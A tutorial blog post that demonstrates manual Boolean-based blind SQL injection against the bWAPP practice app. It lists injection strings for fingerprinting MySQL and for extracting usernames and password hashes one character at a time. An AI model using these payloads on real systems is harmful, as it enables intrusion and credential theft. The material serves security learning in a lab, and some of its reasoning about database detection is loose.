---
title: "Boolean Based Blind SQL Injection on MySQL : How to Do Manually"
publishDate: 2018-07-10
updateDate: 2024-05-06
category: WebAppSec
image:   '~/assets/images/SQli.jpg'
excerpt: This article will guide you on how to do Blind Boolean SQL Injection.
author: Abhinav Kumar
---

This article will guide you on how to do Blind Boolean SQL Injection. It is also known as Inference technique. As I have already told you in the last article that Blind SQL Injection is more like a guessing game and it is time consuming. An automated way is going to save your time but that way you won’t be able to learn it manually. SQLMAP is the best tool for that. To show the manual Blind Boolean SQLi, I am making use of **Beebox Bwapp application**.

Before starting to manually test the application, Let us find out ways to check if an application is vulnerable to Blind SQLi: 1. When testing for Blind SQLi based on Boolean, the website that will be vulnerable, will not load fully as expected when you inject the query. 2. As a testing parameter you can use either OR / AND .Keep in mind that OR means anyone is true and AND means both must be true. According form the query. 3. It is based on the concept of Boolean that means either true or False.

**Query strings that you can use to check:** 
```sql
\_\_\_\_‘ AND 1=1 #
```

When you use this make sure anything that goes in the blank must give a TRUE response otherwise it will always give false. `\_\_\_\_’ OR 1=1 #` –It will always return True no matter what is in the blank.

**Let’s dive in:**

I tried to put name of a movie in the database **‘iron man’.**

![images/Boolean-Based-Blind-SQL-Injection_-How-to-do-manually-1.png](~/assets/images/Boolean-Based-Blind-SQL-Injection_-How-to-do-manually-1.png)

Now to check for Boolean based SQLi, I have used single quote on the page ” **‘** “. The page hasn’t loaded fully and some images haven’t loaded.

So, I put query **iron man’ AND 1=1#** now.

Meaning of the above query is:

iron man is the movie that actually exist in the database. The single ‘ will end the query that actually exist in the backend php. Then AND so we can check another query if it is true. and finally 1=1 which will always be true then comes the # to comment out the statements that comes after it.
![Boolean-Based-Blind-SQL-Injection_-How-to-do-manually-2.png)](~/assets/images/Boolean-Based-Blind-SQL-Injection_-How-to-do-manually-2.png)

OUTPUT: The movie exists in the database. Means the application behind is taking both these values and checking if they are true!

![Boolean-Based-Blind-SQL-Injection_-How-to-do-manually-3.jpg)](~/assets/images/Boolean-Based-Blind-SQL-Injection_-How-to-do-manually-3.jpg)

To take our guessing to the next level, Let’s see how it handles the false queries.

So I used query iron’ AND 1=2# –This query is false because even when iron man movie exist in database, 1 is never equal to 2. and it should generate a False output.

![images/Boolean-Based-Blind-SQL-Injection_-How-to-do-manually-4.png](~/assets/images/Boolean-Based-Blind-SQL-Injection_-How-to-do-manually-4.png) 
OUTPUT: It says the movie doesn’t exist in our database, hence false. 

![images/Boolean-Based-Blind-SQL-Injection_-How-to-do-manually-5.jpg](~/assets/images/Boolean-Based-Blind-SQL-Injection_-How-to-do-manually-5.jpg)
Now you know what does TRUE and FALSE output looks like.

Let’s start the real deal!

The database here is MySQL, how I made sure of that is by trying certain basic queries that MySQL, MsSQL,postgreSQL and Oracle uses as default respectively. If you can just figure out one which gives you the desired Boolean output, you can figure out the database, but it is a tedious task and won’t workout in one go.

```sql
1st Test: **MYSQL uses comment as — — \[the double dash requires an extra space after it \]and #** 

**iron man’ AND 1=1 — — >works**

**iron man’ AND 1=1 # >works**

**MSSQL and Oracle uses — \[no space is required after double dash\] or /\* \*/\[Multiline comments\]**

**iron man’ AND 1=1 — >doesn’t work** I have used double dash without space but it didn’t workout. This removes the possibility of MSSQL or Oracle entirely.
```

```sql
2nd Test: **MySQL uses @@version and version() for checking the version.** **MSSQL uses @@version for checking the version** **Oracle uses SELECT banner FROM v$version** Both @@version and version() worked here. Hence giving me the answer that it is MySQL database at the backend.
```
There are numerous other ways to check the behavior of the application and find out what database it uses but for this application this is suffice.

I used the following queries we get some information about the database.

1. **iron man’ and substring(@@version,1,1)=4#** This query returns true if the mysql version starts with 4. For me it was false. So I tried this iron man’ and substring(@@version,1,1)=5# This query turns out to be true.The substring function takes 3 arguments,**substring(‘somestring’,1,1)** – This says that I want to get the 1st character of the string and another 1 means upto that character only, So If I say **substring(‘something’,1,2)** the output for this will be ‘**so**‘. The third argument defines the number of characters.
2. **iron man’ and substring(database(),1,1)=’a’#** this query checks the name of the database(), one character at a time. Again substring has been used.
3. **iron man’ and (select 1)=1#** this query checks if the sub select works or not. We are checking this so that we can brute force the username charatcers one by one and also the password. The output for this was true,hence we can use the select.
4. **iron man’ AND (select 1 from mysql.user limit 0,1)=1#** This query check if we have the permission to access mysql.user table. The answer for this is true, hence we can access that table. The limit 0,1 will get the 1st row only.
5. **iron man’ AND (select 1 from users limit 0,1)=1#** This query checks if the users table exist. You have to guess different names for it and the process takes time so be patient.
6. **iron man’ AND (select substring(concat(1,password),1,1) from users limit 0,1)=1#** This query will check if the password column exist in the users table.
7. **iron man’ AND (select substring(concat(1,admin),1,1) from users limit 0,1)=1#** This query checks of the admin column exists and gives the output true. I have checked the same for login. Login column also exist in bwapp. which contains the usernames.
8. **iron man’ AND substring((SELECT login from users limit 0,1),1,1)=’a’#** This query will check that the first row value of the login column in the users table. If it is ‘a’ then it will return true or else it will not return false. This is the lengthy part because you have bruteforce every character. There is another way to do it do. You can use the greater than and less than symbol instead equal to. To trim down your searches.
9. Like above you can find out the password too. But since passwords are in MD5, it will take a lot of time. Hence I believe you can practice it all you can, you should know the meaning of the queries you put. But guessing will take a lot of time without exactly seeing the output, hence an automated tool will be good when you are in an environment where your guess isn’t working.
